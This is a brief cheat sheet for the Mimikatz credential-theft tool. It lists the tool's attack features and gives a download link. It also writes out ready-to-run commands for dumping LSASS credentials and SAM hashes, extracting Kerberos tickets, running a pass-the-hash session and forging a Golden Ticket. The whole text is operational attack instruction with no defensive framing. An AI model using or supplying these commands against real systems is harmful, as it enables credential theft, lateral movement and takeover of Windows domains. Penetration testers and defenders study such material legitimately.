 Mimikatz

1. Overview
Mimikatz is a powerful post-exploitation tool used to extract plaintext passwords, hashes, Kerberos tickets, and authentication tokens from Windows memory.

Widely used for:
- Privilege escalation  
- Credential dumping  
- Lateral movement  
- Pass-the-Hash & Pass-the-Ticket attacks  

---

2. Key Features
- Extract plaintext passwords (if WDigest enabled)  
- Dump NTLM hashes  
- Dump Kerberos tickets (TGT & TGS)  
- Golden Ticket and Silver Ticket attacks  
- Pass-the-Hash execution  
- LSASS memory extraction  

---

3. Installation

Windows (recommended)
  Download from the official repo:  
  https://github.com/gentilkiwi/mimikatz/releases

Run from PowerShell as Administrator:
```powershell
.\mimikatz.exe

---

4. Common Commands
Basic
privilege::debug
token::elevate

Dump all credentials
sekurlsa::logonpasswords

Dump hashes (SAM)
lsadump::sam

Dump Kerberos Tickets
sekurlsa::tickets

Pass-the-Hash
sekurlsa::pth /user:admin /ntlm:<hash> /domain:<domain> /run:cmd.exe

Golden Ticket
kerberos::golden /user:admin /domain:test.local /sid:<sid> /krbtgt:<hash> /id:500
